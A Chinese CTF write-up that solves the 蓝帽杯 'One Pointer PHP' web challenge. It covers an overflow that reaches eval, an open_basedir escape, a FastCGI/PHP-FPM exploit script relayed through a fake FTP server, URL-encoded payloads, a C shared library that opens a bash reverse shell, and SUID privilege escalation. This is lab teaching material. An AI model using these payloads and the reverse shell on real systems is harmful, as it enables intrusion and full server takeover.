---
title: "蓝帽杯 One Pointer PHP"
date: 2021-05-04T21:30:20+08:00
---

两个web，一个js小游戏代码审计1小时，玩10秒弹flag什么鬼，还有一个就是这道全场1解题。

```php
<?php
class User{
	public $count;
}

if($user=unserialize($_COOKIE["data"])){
	$count[++$user->count]=1;
	if($count[]=1){
		$user->count+=1;
		setcookie("data",serialize($user));
	}else{
		eval($_GET["backdoor"]);
	}
}else{
	$user=new User;
	$user->count=1;
	setcookie("data",serialize($user));
}
?>
```

题目给了源码，第一关是数组溢出，需要`$count[]=1`，这一步赋值操作报错即可命令执行，貌似php的溢出长度和操作系统有关，我在本地尝试的时候2^31-1即可绕过，但题目上需要2*63-1，不过关系不大，然后蚁剑连上去即可。

```
add_api.php?backdoor=eval($_POST[theoyu])；
蚁剑设置Cookie
data=O%3a4%3a"User"%3a1%3a{s%3a5%3a"count"%3bi%3a9223372036854775806%3b}
```

发现只能看当前目录，多半是`open_basedir`设置了只有当前目录，不过这个好说，p神有文章绕过这个，然后看了一眼**phpinfo()** ...

![image-20210505180925973](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505180925973.png)

**putenv** 居然被过滤了！前几天还专门研究了这个，不过在**phpinfo()** 中发现**Server API =FPM/FastCGI** ，之前学**SSRF** 的时候有接触过这个，可以通过这个RCE，但好像根本没有ssrf的入口..思绪在这里就断了

好像没啥会的了，就尝试读一下配置文件，读取方式如下：

```php
<?php
mkdir('theoyu');
chdir('theoyu');
ini_set('open_basedir','..');
chdir('..');chdir('..');chdir('..');chdir('..');

ini_set('open_basedir','/');

// 此处用来读目录
// $a = new DirectoryIterator("glob:///etc/nginx/sites-enabled/*");
// foreach($a as $f){
//     echo($f->__toString().'<br>');
// }

//此处用来读文件
echo file_get_contents('/etc/nginx/sites-enabled/default');
?>
```

这个读取过程也是很折磨，大概就是一点一点摸索吧，在配置文件发现了fastcgi的开放端口...然后就不会了...

![image-20210505162441456](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505162441456.png)

看wp发现师傅们用的是**ftp 与 php-fpm 对话 RCE**，具体可参考[这一篇文章](https://www.anquanke.com/post/id/233454)，后续我应该也会专门总结一篇关于fastcgi和fpm的文章。

那有了ftp的对话，思路就很清晰了，通过本地vps起一个ftp服务，在靶机上将**fpmRCE**的payload发送给ftp，再又ftp转发给靶机的9001端口形成ssrf，不得不说实在太巧妙了。

**fastcgi** 的攻击脚本有php和go的，经过测试都可以运行，在**php_value** 处把**disable_function**置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。

```php
<?php

class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;

    private $_sock = null;

    private $_host = null;

    private $_port = null;

    private $_keepAlive = false;

    public function __construct($host, $port = 9001) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }

    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }

    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }

    private function connect()
    {
        if (!$this->_sock) {
            //$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            $this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }

    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }

    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }

    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }

    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }

    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }

    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }

    public function request(array $params, $stdin)
    {
        $response = '';
//        $this->connect();
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');
        echo('?file=ftp://ip:9999/&data='.urlencode($request));

    }
}
?>
<?php
// real exploit start here
//if (!isset($_REQUEST['cmd'])) {
//    die("Check your input\n");
//}
//if (!isset($_REQUEST['filepath'])) {
//    $filepath = __FILE__;
//}else{
//    $filepath = $_REQUEST['filepath'];
//}

$filepath = "/var/www/html/add_api.php";
$req = '/'.basename($filepath);
$uri = $req .'?'.'command=whoami';
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php system(\$_REQUEST['command']); phpinfo(); ?>"; // php payload -- Doesnt do anything
$php_value = "unserialize_callback_func = system\nextension_dir = /var/www/html\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "; // extension_dir即为.so文件所在目录
$params = array(
    'GATEWAY_INTERFACE' => 'FastCGI/1.0',
    'REQUEST_METHOD'    => 'POST',
    'SCRIPT_FILENAME'   => $filepath,
    'SCRIPT_NAME'       => $req,
    'QUERY_STRING'      => 'command=whoami',
    'REQUEST_URI'       => $uri,
    'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
    'PHP_VALUE'         => $php_value,
    'SERVER_SOFTWARE'   => '80sec/wofeiwo',
    'REMOTE_ADDR'       => '127.0.0.1',
    'REMOTE_PORT'       => '9001', // 找准服务端口
    'SERVER_ADDR'       => '127.0.0.1',
    'SERVER_PORT'       => '80',
    'SERVER_NAME'       => 'localhost',
    'SERVER_PROTOCOL'   => 'HTTP/1.1',
    'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```

![image-20210505184651947](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505184651947.png)

然后在vps上起ftp：

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 12345))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n') #STOR / (2) 注意打到9001端口的服务
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

```bash
/add_api.php?backdoor=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&file=ftp://ip:12345/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%021%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%A5PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
```

打过去，看vps上的ftp断开，说明对话成功，回头看一眼**phpinfo()**:

![image-20210505185334445](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505185334445.png)

后面就好说了，然鹅当我打开蚁剑，发现还是什么也动不了，命令执行还是和之前一模一样...我傻了

翻阅资料才发现伪造FastCGI请求PHP-CGI本身就是一次性的，相当于执行一次命令(之前gopher打ssrf那个脚本也是同理)，那最好的办法当然还是加载.so去打ssrf了...

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

__attribute__ ((__constructor__)) void hack (void){
    system("bash -c 'bash -i >& /dev/tcp/ip/8000 0>&1'");
}
```

```bash
gcc theoyu.c -shared -o theoyu.so 
```

把theoyu.so传到/var/www/html 目录后，再把之前脚本的php_value改为：

```php
$php_value = "unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = theoyu.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "; // extension_dir即为.so文件所在目录
```

```
/add_api.php?backdoor=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&file=ftp://ip:12345/&data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02G%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%BBPHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+theoyu.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
```

同时vps打开监听，反弹成功后终于可以动了。

![image-20210505204851091](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505204851091.png)

```bash
www-data@2be1b7732d18:/$ ls -al
total 8
drwxr-xr-x    1 root root   78 May  5 09:53 .
drwxr-xr-x    1 root root   78 May  5 09:53 ..
-rwxr-xr-x    1 root root    0 May  5 09:53 .dockerenv
drwxr-xr-x    1 root root  179 Apr 29 14:53 bin
drwxr-xr-x    2 root root    6 Mar 19 23:44 boot
drwxr-xr-x    5 root root  340 May  5 09:53 dev
drwxr-xr-x    1 root root   66 May  5 09:53 etc
-rwx------    1 root root   43 May  5 09:53 flag
drwxr-xr-x    2 root root    6 Mar 19 23:44 home
drwxr-xr-x    1 root root   45 Apr 29 14:53 lib
drwxr-xr-x    2 root root   34 Apr  8 00:00 lib64
drwxr-xr-x    2 root root    6 Apr  8 00:00 media
drwxr-xr-x    2 root root    6 Apr  8 00:00 mnt
drwxr-xr-x    2 root root    6 Apr  8 00:00 opt
dr-xr-xr-x 2312 root root    0 May  5 09:53 proc
drwx------    1 root root    6 Apr 29 15:13 root
drwxr-xr-x    1 root root   23 May  5 09:53 run
drwxr-xr-x    2 root root 4096 Apr  8 00:00 sbin
drwxr-xr-x    2 root root    6 Apr  8 00:00 srv
dr-xr-xr-x   13 root root    0 May  5 04:25 sys
drwxrwxrwt    1 root root    6 May  5 12:40 tmp
drwxr-xr-x    1 root root   19 Apr  8 00:00 usr
drwxr-xr-x    1 root root   39 Apr 29 14:53 var
```
但是发现 **/flag**还是不能读取，之后就是一个简单的suid提权。
```bash
www-data@2be1b7732d18:/$ find / -perm -u=s -type f 2>/dev/null

/bin/mount
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/local/bin/php
```

发现php就有s权限，直接写一个php执行读取即可。

```php
<?php
mkdir('theoyu');
chdir('theoyu');
ini_set('open_basedir','..');
chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir','/');
echo file_get_contents("/flag");
?>
```

![image-20210505211624222](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505211624222.png)

## 工具流谬杀

本来以为这就结束了，看大佬博客的时候居然看到一位师傅改蚁剑脚本就能解题，我?????，复现一下。

![image-20210505213712742](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505213712742.png)

蚁剑的自带工具就有关于FCGI的disable_function绕过，但要求**fsockopen**函数没有被过滤，并且默认端口为9000，所以当然直接用是绕过不了的。

但是php中还有一个**pfsockopen**函数，两者的区别仅仅只是发包**Keep-Alive**上的区别，对问题毫无影响！那我们直接深入到payload源码中去。

- \antData\plugins\as_bypass_php_disable_functions-master\payload.js
- \antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js

把9000端口改为9001,**fsockopen**改为**pfsockopen**,然后传一个普通的一句话在html/下，用这个php去连接。

![image-20210505214756517](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505214756517.png)

会在**html/**生成一个**.antproxy.php**文件。

![image-20210505220251625](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505220251625.png)

再用这个文件做马连接蚁剑，发现已经成为root用户..用php权限可直接查看flag。。。太骚了，妥妥的非预期。

![image-20210505220421304](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505220421304.png)

## 后话

这一题还是挺牛逼的，结合的知识点相当多，无论是恶意加载链接库，fastcgi未授权访问，还是ftp打ssrf都可以写一篇文章，慢慢学吧~

## 参考

- [webcgi-exploits](https://github.com/wofeiwo/webcgi-exploits)
- [PHP绕过open_basedir列目录的研究](https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html)
- [Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)
- [phith0n-fpm.py](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)

